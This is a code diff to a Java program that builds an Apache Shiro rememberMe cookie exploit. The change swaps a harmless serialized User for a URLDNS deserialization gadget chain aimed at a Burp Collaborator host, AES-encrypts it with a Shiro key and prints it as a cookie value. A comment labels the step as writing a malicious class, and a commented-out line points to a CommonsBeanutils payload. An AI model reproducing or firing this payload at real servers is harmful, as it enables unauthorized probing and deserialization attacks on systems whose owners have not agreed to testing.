@@ -1,7 +1,7 @@
 package shiro;
 
 import beans.User;
-import expUtils.PayloadUtils;
+import expUtils.ExpUtils;
 import org.apache.shiro.codec.Base64;
 import org.apache.shiro.crypto.AesCipherService;
 import org.apache.shiro.mgt.AbstractRememberMeManager;
@@ -13,6 +13,7 @@ import java.io.BufferedOutputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.ObjectOutputStream;
+import java.util.HashMap;
 
 public class Decrypt {
     public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException {
@@ -23,11 +24,14 @@ public class Decrypt {
 
 //        PayloadUtils.getCommonBeanExp()
 //        ExpUtils.getURLDNSChains("http://c8l76f8p9qm9xno5aue84mr5vw1ppe.burpcollaborator.net")
+
+        HashMap hashMap =  ExpUtils.getURLDNSChains("http://n4swhvolqvi359z9yoofrl1q0h67uw.burpcollaborator.net");
+
         ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
         BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(byteArrayOutputStream);
         ObjectOutputStream objectOutputStream = new ObjectOutputStream(bufferedOutputStream);
 //        写入恶意累
-        objectOutputStream.writeObject(user);
+        objectOutputStream.writeObject(hashMap);
         objectOutputStream.close();
         byte[] payload = byteArrayOutputStream.toByteArray();
         System.out.println(payload.length);
@@ -39,7 +43,7 @@ public class Decrypt {
         // 加密
         ByteSource byteSource = aesCipherService.encrypt(payload,Base64.decode(key));
         String cipherSelf = Base64.encodeToString(byteSource.getBytes());
-        System.out.println(cipherSelf);
+        System.out.println("rememberMe: " + cipherSelf);
 
 
         // 解密
